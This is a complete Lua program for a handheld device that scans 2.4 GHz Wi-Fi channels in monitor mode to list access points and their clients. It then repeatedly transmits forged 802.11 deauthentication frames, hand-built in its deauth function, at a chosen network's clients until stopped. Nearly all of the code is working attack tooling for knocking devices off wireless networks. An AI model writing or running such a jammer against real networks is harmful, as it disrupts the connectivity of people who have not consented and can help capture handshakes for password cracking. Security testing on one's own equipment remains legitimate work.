-- Deauth (ACTIVE, transmits). Pick an AP (broadcast to all its clients) or one client seen on it.
-- Scan: beacons give APs; data frames give associated clients (MAC of the non-AP end).
-- Transmits until Back. Frames are management deauth (subtype 12), 26 bytes, FCS added by the radio.

local DWELL_MS = 800
local BURST_SLEEP_MS = 100
local FRAMES_PER_BURST = 3
local MAX_APS = 30
local MAX_CLIENTS = 80
local CHANS = { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
local BCAST = string.rep("\255", 6)
local LH = 26

local W, H = 0, 0
local aps, ap_list = {}, {}
local clients, client_count = {}, 0     -- clients[bssid] = { {sta=, rssi=}, ... }
local ci, last_hop = 1, 0
local menu_cur = 1

local function clip(s, n) return #s > n and s:sub(1, n) or s end
local function mac(b) return string.format("%02x:%02x:%02x:%02x:%02x:%02x", b:byte(1, 6)) end
local function header(t) gfx.rect(0, 0, W, 40, true); gfx.text(14, 10, t, "ui12", "bw") end

local function screen(title, lines, footer)
  gfx.clear(); W, H = gfx.size()
  header(title)
  local y = 56
  for _, l in ipairs(lines) do gfx.text(16, y, l, "ui12"); y = y + LH + 4 end
  gfx.text(14, H - 34, footer, "small")
  gfx.present()
end

-- ---------- scan ----------
local function on_beacon(frame, ch, rssi)
  if #frame < 37 then return end
  local bssid = frame:sub(17, 22)
  local ssid = ""
  local i = 37
  while i + 1 <= #frame do
    local tag, len = frame:byte(i), frame:byte(i + 1)
    if tag == 0 then ssid = frame:sub(i + 2, i + 1 + len); break end
    i = i + 2 + len
  end
  if not ssid:match("^[%g ]*$") then ssid = "" end
  local a = aps[bssid]
  if not a then
    if #ap_list >= MAX_APS then return end
    a = { bssid = bssid, ssid = ssid, ch = ch, rssi = rssi or -99 }
    aps[bssid] = a
    ap_list[#ap_list + 1] = a
  else
    if ssid ~= "" then a.ssid = ssid end
    a.ch = ch
    if rssi then a.rssi = rssi end
  end
end

-- Data frame: the BSSID and the station come from the To/From DS bits.
local function on_data(frame, rssi)
  if #frame < 24 then return end
  local ds = frame:byte(2) & 0x03
  local bssid, sta
  if ds == 0x01 then bssid, sta = frame:sub(5, 10), frame:sub(11, 16)      -- to AP
  elseif ds == 0x02 then bssid, sta = frame:sub(11, 16), frame:sub(5, 10)  -- from AP
  else return end                                                          -- ad-hoc / WDS: skip
  if sta == BCAST or sta == bssid then return end
  if client_count >= MAX_CLIENTS then return end
  local list = clients[bssid]
  if not list then list = {}; clients[bssid] = list end
  for _, c in ipairs(list) do
    if c.sta == sta then
      if rssi then c.rssi = rssi end
      return
    end
  end
  list[#list + 1] = { sta = sta, rssi = rssi or -99 }
  client_count = client_count + 1
end

local function scan()
  local ok, err = wifi.monitor_start({ channel = CHANS[ci] })
  if not ok then return nil, err end
  last_hop = system.millis()
  while true do
    local frame, meta = wifi.monitor_recv()
    while frame do
      local ch = (meta and meta.channel) or CHANS[ci]
      local rssi = meta and meta.rssi
      local t = frame:byte(1) & 0x0C
      local st = (frame:byte(1) >> 4) & 15
      if t == 0x00 and st == 8 then on_beacon(frame, ch, rssi)
      elseif t == 0x08 then on_data(frame, rssi) end
      frame, meta = wifi.monitor_recv()
    end
    if system.millis() - last_hop >= DWELL_MS then
      ci = ci % #CHANS + 1
      wifi.monitor_channel(CHANS[ci])
      last_hop = system.millis()
    end
    screen("Scanning 2.4 GHz",
      { string.format("%d APs heard", #ap_list), string.format("%d clients seen", client_count),
        "channel " .. CHANS[ci] },
      "Confirm = pick target, Back = quit")
    local e = input.poll()
    if e == "back" then wifi.monitor_stop(); return nil end
    if e == "confirm" and #ap_list > 0 then break end
    app.sleep(20)
  end
  wifi.monitor_stop()
  return true
end

-- ---------- pickers ----------
local function menu(title, items, label_fn, footer)
  local cur = 1
  while true do
    gfx.clear(); W, H = gfx.size(); header(title)
    local y = 56
    for i, it in ipairs(items) do
      if y > H - 70 then break end
      local label = label_fn(it)
      if i == cur then gfx.rect(10, y - 4, W - 20, LH + 4, true); gfx.text(16, y, label, "small", "w")
      else gfx.text(16, y, label, "small") end
      y = y + LH
    end
    gfx.text(14, H - 34, footer, "small")
    gfx.present()
    local e = input.wait()
    if e == "up" then cur = cur > 1 and cur - 1 or #items
    elseif e == "down" then cur = cur < #items and cur + 1 or 1
    elseif e == "confirm" and #items > 0 then return items[cur]
    elseif e == "back" then return nil end
  end
end

local function pick_ap()
  return menu("Pick AP", ap_list, function(a)
    local nc = clients[a.bssid] and #clients[a.bssid] or 0
    return string.format("%-14s ch%-2d %4d  cl:%d", clip(a.ssid ~= "" and a.ssid or "<hidden>", 14), a.ch, a.rssi, nc)
  end, "Up/Down, Confirm select, Back cancel")
end

local function pick_target(ap)
  local items = { { broadcast = true } }
  for _, c in ipairs(clients[ap.bssid] or {}) do items[#items + 1] = { sta = c.sta, rssi = c.rssi } end
  return menu("Target on " .. clip(ap.ssid ~= "" and ap.ssid or mac(ap.bssid), 18), items, function(it)
    if it.broadcast then return "ALL clients (broadcast)" end
    return string.format("client %s  %d", mac(it.sta), it.rssi)
  end, "Up/Down, Confirm fire, Back cancel")
end

-- ---------- frames ----------
-- deauth: frame control C0 00, duration, addr1 = dst, addr2 = src, addr3 = BSSID, seq, reason 7
local function deauth(dst, src, bssid)
  return "\192\0\0\0" .. dst .. src .. bssid .. "\0\0\7\0"
end

local function fire(ap, target)
  local ok, err = wifi.tx_start({ channel = ap.ch })
  if not ok then
    screen("Transmit", { "Could not start:", clip(tostring(err), 50) }, "Back to exit")
    while input.wait() ~= "back" do end
    return
  end
  local frames
  if target.broadcast then
    frames = { deauth(BCAST, ap.bssid, ap.bssid) }
  else
    frames = { deauth(target.sta, ap.bssid, ap.bssid), deauth(ap.bssid, target.sta, ap.bssid) }
  end
  local last_draw = -1000
  while true do
    local now = system.millis()
    for _ = 1, FRAMES_PER_BURST do
      for _, f in ipairs(frames) do wifi.tx(f) end
    end
    if now - last_draw >= 1000 then
      local info = wifi.tx_info()
      screen("TRANSMITTING", {
        clip(ap.ssid ~= "" and ap.ssid or mac(ap.bssid), 26),
        "ch " .. ap.ch .. "   " .. (target.broadcast and "all clients" or ("client " .. mac(target.sta))),
        "sent " .. (info and info.sent or 0),
      }, "Back = stop")
      last_draw = now
    end
    if input.poll() == "back" then break end
    app.sleep(BURST_SLEEP_MS)
  end
  wifi.tx_stop()
  screen("Stopped", { "Transmit off." }, "Back to exit")
  while input.wait() ~= "back" do end
end

local function main()
  W, H = gfx.size()
  screen("Deauth (ACTIVE)", {
    "Transmits deauth frames until Back.",
    "Disrupts the AP's clients (or one client).",
    "Confirm to start the scan.",
  }, "Confirm = start, Back = quit")
  if input.wait() ~= "confirm" then return end
  if not scan() then return end
  local ap = pick_ap()
  if not ap then return end
  local target = pick_target(ap)
  if not target then return end
  fire(ap, target)
end

local ok, err = pcall(main)
if not ok then
  pcall(function() wifi.tx_stop() end)
  pcall(function() wifi.monitor_stop() end)
  gfx.clear()
  gfx.text(10, 10, "err: " .. tostring(err):sub(1, 60), "ui12", "b")
  gfx.present()
  while input.wait() ~= "back" do end
end
pcall(function() wifi.tx_stop() end)
app.exit()
